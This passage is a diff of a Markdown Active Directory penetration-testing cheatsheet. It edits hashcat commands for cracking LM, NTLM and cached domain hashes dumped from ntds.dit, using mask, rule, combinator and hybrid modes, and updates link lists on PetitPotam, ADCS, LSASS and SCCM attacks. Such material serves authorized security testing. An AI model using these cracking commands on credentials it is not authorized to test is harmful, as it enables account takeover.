 hashcat -m 3000 -a 0 lm_hashes.txt ../../wordlists/rockyou_2021.txt
 ```
 
 #### NTLM hash
-Hashcat mask attack: A mask attack is an evolution over the brute-force and allows us to be more selective over the keyspace in certain positions.  
+Hashcat mask attack
 - https://hashcat.net/wiki/doku.php?id=mask_attack
 ```
-hashcat -m 1000 -a 3 ntds.dit ?u?l?l?l?l?d?d?d?d?s
-hashcat -m 1000 -a 3 ntds.dit Company?d?d?d?s
-```
-
-Mask attack using custom charset for specific characters:
-- 1 ?d?s defines a custom charset (digits and specials).
-- ?u?l?l?l?l?l?l?l?1 is the mask, where ?1 is the custom charset.
-```
-hashcat.exe -a 3 -m 1000 ntds.dit -1 ?d?s ?u?l?l?l?l?l?l?l?1
+hashcat -m 1000 -a 3 ntds.dit.ntds ?u?l?l?l?l?d?d?d?d?s
 ```
 
 Hashcat rule based cracking
 ```
-hashcat -m 1000 -a 0 --username ntds.dit ../../wordlists/rockyou_2021.txt -r ../../wordlists/OneRuleToRuleThemAll.rule
+hashcat -m 1000 -a 0 --username ntds.dit.ntds ../../wordlists/rockyou_2021.txt -r ../../wordlists/OneRuleToRuleThemAll.rule
 ```
 
 Hashcat wordlist cracking
 ```
-hashcat -m 1000 -a 0 --username ntds.dit ../../wordlists/rockyou_2021.txt
-```
-
-Hashcat using mask length and mask files (hcmask)
-```
-lutzenfried@xec:~ cat ./test.hcmask
-?d?s,?u?l?l?l?l?1
-?d?s,?u?l?l?l?l?l?1
-?d?s,?u?l?l?l?l?l?l?1
-?d?s,?u?l?l?l?l?l?l?l?1
-?d?s,?u?l?l?l?l?l?l?l?l?1
-?d?s,?u?l?l?l?l?l?l?l?1?1
-?d?s,?u?l?l?l?l?l?l?1?1
-?d?s,?u?l?l?l?l?l?1?1
-?d?s,?u?l?l?l?l?1?1
-?d?s,?u?l?l?l?1?1?1
-?d?s,?u?l?l?l?l?1?1?1
-?d?s,?u?l?l?l?l?l?1?1?1
-?d?s,?u?l?l?l?l?l?l?1?1?1
-?d?s,?u?l?l?l?l?l?1?1?1?1
-?d?s,?u?l?l?l?l?1?1?1?1
-?d?s,?u?l?l?l?1?1?1?1
-?d?s,?u?l?l?1?1?1?1
-?d?s,?u?l?1?1?1?1?1
-?d?s,?u?l?l?1?1?1?1?1
-?d?s,?u?l?l?l?1?1?1?1?1
-?d?s,?u?l?l?l?l?1?1?1?1?1
-
-hashcat -m 1000 -a 3 -m 1000 NTDS.dit test.hcmask
+hashcat -m 1000 -a 0 --username ntds.dit.ntds ../../wordlists/rockyou_2021.txt
 ```
 
 #### Net-NTLMv1
@@ -1842,45 +1794,11 @@ Slow to be cracked due to PBKDF2 usage (*PBKDF2(HMAC-SHA1, 10240, DCC1, username
 hashcat -m 2100 -a 0 DCC2_hashes.txt ../../wordlists/rockyou_2021.txt
 ```
 
-Within Hashcat other mode such as Hybrid (6 and 7) and Combinator (1) can be used:
-- Combinator will combine 2 dictionaries/wordlists
-```
-lutzenfried@xec:~ cat wordlist1.txt
-wifi
-wireless
 
-lutzenfried@xec:~ cat wordlist2.txt
-pass
-password
 
-# Some rule will be apply using -j and -k 
-hashcat -m 22000 PSK_capture.hccap wordlist1.txt wordlist2.txt -j $- -k $23
 
-wifi-pass23
-wireless-pass23
-wifi-pass23
-wifi-password23
-```
 
-- Hybrid: This mode will apply a mask to specific wordlist
-```
-lutzenfried@xec:~ cat wordlist.txt
-Pass
-Password
-Azerty
 
-hashcat.exe -a 6 -m 1000 NTDS.dit wordlist.txt ?d?d?d?d
-Pass0000
-Password0000
-Azerty0000
-```
-
-[Keyboard walks](https://bytesdarkly.com/2014/08/generating-keyboard-walks/) wordlists:  
-- https://github.com/hashcat/kwprocessor.git
-- https://github.com/Rich5/Keyboard-Walk-Generators
-```
-lutzenfried@xec:~ /tmp/kwprocessor ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route -o key_walk_en_us_10_max.txt
-```
 
 
 ## Reporting / Collaborative
@@ -1897,7 +1815,7 @@ lutzenfried@xec:~ /tmp/kwprocessor ./kwp basechars/full.base keymaps/en-us.keyma
 dpat.py -n ntds.dit -c hashcat.potfile -g "Domain Admins.txt" "Enterprise Admins.txt"
 ```
 
-<img src="./images/dpat.png" width="250"/>
+<img src="../images/dpat.png" width="250"/>
 
 
 
@@ -1971,7 +1889,7 @@ dpat.py -n ntds.dit -c hashcat.potfile -g "Domain Admins.txt" "Enterprise Admins
 - https://0xsp.com/offensive/red-team-cheatsheet/
 
 #### OCD - AD Mind Map
-- https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
+- https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
 
 #### PetitPotam and ADCS
 - https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services
@@ -1979,7 +1897,6 @@ dpat.py -n ntds.dit -c hashcat.potfile -g "Domain Admins.txt" "Enterprise Admins
 #### Active Directory Exploitation cheatsheet
 - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 - https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition
-- 
 
 #### Attacking Active Directory
 - https://www.youtube.com/watch?v=MIt-tIjMr08
@@ -2021,6 +1938,7 @@ Tools:
 - [SyncAppvPublishingServer]()
 
 
+#### To do
 
 - https://h4ms1k.github.io/Red_Team_Active_Directory/#
 - https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html
@@ -2055,11 +1973,13 @@ https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-re
 https://www.ravenswoodtechnology.com/protect-your-windows-network-from-the-petitpotam-exploit/
 - ADCS
 https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#domain-escalation-via-certificates
-https://www.youtube.com/watch?v=-KuCaJXSyXA
+https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
 https://github.com/ly4k/Certipy
 - adsecurity all
 - Wdigest
 - windows authentication cache (HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\CachedLogonsCount)
+- LSASS
+- DPAPI
 - xfreerdp tool
 - Service accounts with interactive logon
 - Permissive Active Directory Domain Services https://blog.netspi.com/exploiting-adidns/
@@ -2068,19 +1988,13 @@ https://github.com/ly4k/Certipy
 - Pypykatz
 - Spraykatz
 - VLAN hopping
-- STP - network layer attacks
 - SNMP default
 - Potato family : https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
 - SMTP
 - ACL/DACL exploitation
 - Owner https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#owns
 - Hekatomb tool (https://github.com/Processus-Thief/HEKATOMB)
-- SCCM
-  - https://labs.nettitude.com/blog/introducing-malsccm/
-  - https://www.scribd.com/document/204221426/Owning-One-Rule-All-v2#
-  - https://enigma0x3.net/2016/02/29/offensive-operations-with-powersccm/
-  - https://harmj4.rssing.com/chan-30881824/article40.html
 
-- Protections
-LAPS, JEA, WSL, RBCD, WDAC, ASR, AWL,Kerberos Armoring, Compound Authentication, RunasPPL, RedForest (PAM),  Credential Guard, CLM, virtualization 
-- https://www.sstic.org/2017/presentation/administration_en_silo/
+
+LAPS, JEA, WSL, RBCD, WDAC, ASR, AWL, Credential Guard, CLM, virtualization 
+
